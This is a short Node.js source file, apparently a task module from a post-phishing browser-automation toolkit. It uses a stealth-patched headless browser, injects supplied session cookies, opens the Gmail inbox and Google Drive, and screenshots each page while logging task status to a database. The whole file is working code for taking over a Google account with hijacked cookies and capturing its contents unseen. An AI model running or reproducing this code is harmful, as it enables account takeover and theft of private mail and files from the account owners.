const puppeteer = require('puppeteer-extra')
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const { Cluster } = require('puppeteer-cluster');
const necrohelp = require('../../tasks/helpers/necrohelp')
const db = require('../../db/db')

exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
    // update initial task status from queued to running
    await db.UpdateTaskStatus(taskId, "running")

    await page.setCookie(...cookies);

    await page.goto('https://mail.google.com/mail/u/0/#inbox');
    //await necrohelp.ScreenshotCurrentPage(page, taskId)
    await page.waitForTimeout(2000)
    await necrohelp.ScreenshotCurrentPage(page, taskId)

    await page.click('a[aria-label="Google apps"]').catch(console.error)
    console.log('clicking apps waffle')
    await page.waitForTimeout(2000)

    await page.goto('https://drive.google.com/drive/my-drive')
    await page.waitForTimeout(2000)
    await necrohelp.ScreenshotCurrentPage(page, taskId)

    await db.UpdateTaskStatus(taskId, "completed")
}
